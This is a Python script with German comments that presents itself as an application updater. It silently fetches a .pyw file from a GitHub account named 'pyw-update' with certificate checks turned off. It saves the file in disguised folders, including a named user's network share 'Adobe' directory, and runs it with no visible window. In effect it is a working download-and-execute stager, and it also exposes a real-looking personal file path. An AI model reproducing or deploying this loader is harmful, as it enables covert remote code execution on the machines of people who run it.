import ssl
import sys
import os
import time
import urllib.request
import subprocess
import shutil

# ────────────────────────────────────────────────
# KONFIGURATION
FILE_NAME = "applicationdebugger.pyw"  # Name der Hauptdatei deiner Anwendung
UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME

# Pfade
if os.path.exists(r"\\KL-FS01\Benutzer$\anakin-luke.hoffmann\Eigene Dateien\Adobe"):
    LOCAL_APPDATA = r"\\KL-FS01\Benutzer$\anakin-luke.hoffmann\Eigene Dateien\Adobe"
elif "WindowsApps" in sys.executable:
    LOCAL_APPDATA = os.path.join(os.environ["USERPROFILE"], "Pictures")
else:
    LOCAL_APPDATA = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
APP_DIR = os.path.join(LOCAL_APPDATA, "UpdateFramework")
APP_PATH = os.path.join(APP_DIR, FILE_NAME)
venv_dir = os.path.join(APP_DIR, ".venv")
venv_python = os.path.join(venv_dir, "Scripts", "python.exe")

# Windows-spezifisch
IS_WINDOWS = True

# ────────────────────────────────────────────────
def kill_running_main():
    """Beendet nur die Hauptanwendung, nicht den Updater selbst"""
    try:
        subprocess.run(
            ["taskkill", "/F", "/IM", FILE_NAME],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW # type: ignore
        )
        time.sleep(1)
    except Exception:
        pass

# ────────────────────────────────────────────────
def download_update():
    """Lädt die neue Version herunter"""
    temp_path = APP_PATH + ".new"
    try:
        context = ssl._create_unverified_context()
        req = urllib.request.Request(UPDATE_URL)
        req.add_header('Pragma', 'no-cache')
        with urllib.request.urlopen(req, timeout=15, context=context) as resp:
            if resp.status != 200:
                return None
            data = resp.read()
        os.makedirs(APP_DIR, exist_ok=True)
        with open(temp_path, "wb") as f:
            f.write(data)
        return temp_path
    except Exception:
        if os.path.exists(temp_path):
            try:
                os.unlink(temp_path)
            except:
                pass
        return None

# ────────────────────────────────────────────────
def apply_update(temp_file):
    """Ersetzt die alte Datei mit der neuen"""
    attempts = 5
    for i in range(attempts):
        try:
            if os.path.exists(APP_PATH):
                try:
                    os.remove(APP_PATH)
                except PermissionError:
                    kill_running_main()
                    time.sleep(1 + i)
            shutil.move(temp_file, APP_PATH)
            try:
                os.chmod(APP_PATH, 0o755)
            except:
                pass
            return True
        except PermissionError:
            kill_running_main()
            time.sleep(1 + i)
        except Exception:
            return False
    return False

# ────────────────────────────────────────────────
def try_install_venv() -> bool:
    """Erstellt venv, falls nicht vorhanden"""
    if not os.path.exists(venv_dir):
        result = subprocess.run([sys.executable, "-m", "venv", venv_dir])
        if result.returncode == 0:
            print("Virtual environment created.")
            return True
        else:
            print("Failed to create virtual environment.")
            return False
    return True

# ────────────────────────────────────────────────
def install_dependencies():
    """Installiert requests in venv, falls nicht vorhanden"""
    try:
        import requests
        print("Dependencies already installed.")
        return
    except ImportError:
        print("Installing dependencies...")

    result = subprocess.run([venv_python, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL)
    if result.returncode == 0:
        print("Dependencies installed successfully.")
    else:
        print("Failed to install dependencies.")

    try:
        import requests
    except ImportError:
        print("Failed to import dependencies after installation.")

# ────────────────────────────────────────────────
def start_main_app():
    """Startet die Hauptanwendung zuverlässig unter Windows"""
    if not os.path.exists(APP_PATH):
        return False
    try:
        subprocess.Popen([venv_python, APP_PATH], creationflags=subprocess.CREATE_NO_WINDOW) # type: ignore
        return True
    except Exception as e:
        print("Startfehler:", e)
        return False

# ────────────────────────────────────────────────
def main():
    os.makedirs(APP_DIR, exist_ok=True)

    # Hauptanwendung beenden
    kill_running_main()
    time.sleep(1)

    # Update herunterladen
    new_file = download_update()
    if new_file:
        apply_update(new_file)

    # Venv erstellen und Abhängigkeiten installieren
    if try_install_venv():
        install_dependencies()
        print("Virtual environment is ready.")
    else:
        print("Failed to create virtual environment.")

    # Hauptanwendung starten
    start_main_app()
    sys.exit(0)

# ────────────────────────────────────────────────
if __name__ == "__main__":
    main()
